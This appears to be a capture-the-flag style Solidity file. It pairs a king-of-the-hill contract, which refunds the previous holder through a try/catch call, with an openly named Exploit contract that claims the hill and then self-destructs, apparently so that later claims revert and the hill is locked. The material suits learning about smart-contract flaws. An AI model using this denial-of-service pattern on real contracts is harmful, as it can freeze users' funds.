pragma solidity 0.8.19;

interface IRobot {
    function refund() external payable;
    function isRobot() external view returns (bool);
}

contract IRobotOfTheHill {
    IRobot public robot;
    uint256 public price;

    function claim() external payable {
        require(msg.value > price, "the amount is too small");
        require(IRobot(msg.sender).isRobot(), "not a robot");

        if(address(robot) != address(0)) {
            try robot.refund{gas: 2100, value: price}() { }
            catch(bytes memory err) { }
        }

        robot = IRobot(msg.sender);
        price = msg.value;
    }
}


contract Exploit {
    IRobotOfTheHill hill;
    constructor(address robotOfTheHillAddress) payable {
        hill = IRobotOfTheHill(robotOfTheHillAddress);
    }

    function attack() external {
        hill.claim{value: address(this).balance}();
        selfdestruct(payable(address(0)));
    }
    
    function isRobot() external pure returns (bool) {
        uint256 count = 0;
        return true;
    }
    function refund() external payable {

    }
}
